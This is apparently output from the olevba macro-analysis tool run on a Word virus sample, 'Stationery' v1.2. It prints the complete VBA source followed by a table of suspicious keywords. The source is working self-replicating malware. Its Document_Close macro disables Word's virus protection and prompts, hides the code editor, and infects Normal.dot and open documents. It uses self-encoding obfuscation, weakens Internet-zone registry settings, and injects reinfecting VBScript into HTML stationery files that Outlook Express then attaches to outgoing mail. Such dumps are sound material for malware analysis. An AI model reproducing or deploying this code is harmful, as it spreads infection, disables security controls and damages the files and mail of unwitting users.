olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Stationary.b-868a85917e9303966225d66627a67138b38d621b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Stationary.b-868a85917e9303966225d66627a67138b38d621b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Stationery
'v1.2, Residency :)
'by CyberShadow//SMF
Private Sub Document_Close()
 With Application
  .EnableCancelKey = False
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 If NT.Lines(1, 1) <> "'Stationery" Then
  NT.DeleteLines 1, NT.CountOfLines
  NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
 End If
 If AD.Lines(1, 1) <> "'Stationery" Then
  AD.DeleteLines 1, AD.CountOfLines
  AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
 End If
 CrStr = getname()
 Call compile(CryptedString, CrStr)
 Call CorrectLine(CryptedString, CrStr)
 a = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery", "Stationery Folder") + "\"
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
 System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
 Call infectHTML(a, CryptedString, CrStr)
End Sub
Private Sub infectHTML(a, CryptedString, CrStr)
 With Application.FileSearch
  .FileName = "*.htm"
  .MatchAllWordForms = True
  .LookIn = a
  .SearchSubFolders = True
  .Execute
  For i = 1 To .FoundFiles.Count
   c = .FoundFiles(i)
   Open c For Input As 1
    If LOF(1) > 55000 Then GoTo ExitRead
    e = ""
    Do While Not EOF(1)
     Line Input #1, a2
     d = a2
     If Len(d) >= 3 Then
      b = UCase(d)
      If b = "<HTML> <CYBERSHADOW...>" Then GoTo ExitRead
      If b = "<HTML>" Then b = "<html> <CyberShadow...>": d = b
      For j = 1 To Len(b) - 6
       If Mid$(b, j, 8) = "</BODY>" Then
        d = Left$(b, j + 7) + Chr$(13) + Chr$(10)
        d = d + "<body>" + Chr$(13) + Chr$(10)
        d = d + "<script language=""VBScript"">" + Chr$(13) + Chr$(10)
        d = d + "<!--" + Chr$(13) + Chr$(10)
        d = d + "On Error Resume Next" + Chr$(13) + Chr$(10)
        d = d + CryptedString + Chr$(13) + Chr$(10)
        d = d + "Dim FSO" + Chr$(13) + Chr$(10)
        d = d + "Set FSO = CreateObject(""Scripting.FileSystemObject"")" + Chr$(13) + Chr$(10)
        d = d + "Set WordObj = GetObject("""", ""Word.Application""): Quit = 0" + Chr$(13) + Chr$(10)
        d = d + "If WordObj = """" Then" + Chr$(13) + Chr$(10)
        d = d + "Set WordObj = CreateObject(""Word.Application""): Quit = 1" + Chr$(13) + Chr$(10)
        d = d + "End If" + Chr$(13) + Chr$(10)
        d = d + "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule" + Chr$(13) + Chr$(10)
        d = d + "If NT.Lines(1, 1) <> ""'Stationery"" Then" + Chr$(13) + Chr$(10)
        d = d + "WordObj.Options.SaveNormalPrompt = False" + Chr$(13) + Chr$(10)
        d = d + "NT.DeleteLines 1, NT.CountOfLines" + Chr$(13) + Chr$(10)
        d = d + "NT.InsertLines 1," + CrStr + Chr$(13) + Chr$(10)
        d = d + "End If" + Chr$(13) + Chr$(10)
        d = d + "Set NT = Nothing" + Chr$(13) + Chr$(10)
        d = d + "If Quit = 1 Then WordObj.Quit" + Chr$(13) + Chr$(10)
        d = d + "--></script>" + Chr$(13) + Chr$(10)
        d = d + "</body>" + Chr$(13) + Chr$(10)
        j = j + 7
        If (Len(b) - j - 7) > 0 Then d = d + Right$(b, Len(b) - j - 7)
       End If
      Next
     End If
     e = e + d + Chr$(13) + Chr$(10)
    Loop
    Close #1
    Open c For Output As 1
     Print #1, e
     identities = System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities", "Default User ID")
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\" + identities + "\Software\Microsoft\Outlook Express\5.0\Mail", "Stationery Name") = c
ExitRead:
   Close #1
  Next i
 End With
End Sub
Private Sub CorrectLine(CryptedString, CrStr)
 maxlen = Int(Rnd * 100) + 100
 c = "": l = 0: f2 = -1
 For i = 1 To Len(CryptedString)
  b = Mid$(CryptedString, i, 1)
  If b = """" Then f2 = -f2
  If l > maxlen And f2 = 1 Then
   c = c + """"
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr + "+""": l = Len(c)
  End If
  If b = "+" And l >= maxlen Then
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr: l = Len(c)
  End If
  c = c + b: l = l + 1
 Next
 CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
 CryptedString = CryptedS
End Sub
Private Function getname()
 c = ""
 For i = 1 To Int(Rnd * 7) + 1
  b = Int(Rnd * 26) + 65
  If Rnd > 0.5 Then b = b + 32
  c = c + Chr$(b)
 Next
 c = c + Chr$(Asc("0") + Int(Rnd * 9))
 getname = c
End Function
Private Sub compile(CryptedString, CrStr)
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 a = AD.Lines(1, AD.CountOfLines)
 CryptedString = CrStr + "="
 fl = 0
 For i = 1 To Len(a)
  b = Asc(Mid$(a, i, 1))
  If (b < 33) Or b = Asc("""") Or b = Asc("+") Or b = Asc("_") Or b = Asc("^") Or b = Asc(">") Or b = Asc("<") Then
    If fl = 1 Then CryptedString = CryptedString + """"
    CryptedString = CryptedString + "+chr(" + Str$(b) + ") ": fl = 0
   Else
    If fl = 0 Then
     If Mid$(CryptedString, Len(CryptedString) - 1, 1) = ")" Then CryptedString = CryptedString + "+"
     CryptedString = CryptedString + """"
    End If
    CryptedString = CryptedString + Chr$(b): fl = 1
  End If
 Next
 If Mid$(CryptedString, Len(CryptedString) - 1, 1) <> " " And Mid$(CryptedString, Len(CryptedString) - 1, 1) <> ")" Then CryptedString = CryptedString + """"
End Sub
Private Sub ViewVBCode(): Stealth: End Sub
Private Sub ToolsMacro(): Stealth: End Sub
Private Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth()
On Error Resume Next
Application.ShowVisualBasicEditor = 0
Application.EnableCancelKey = 0
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

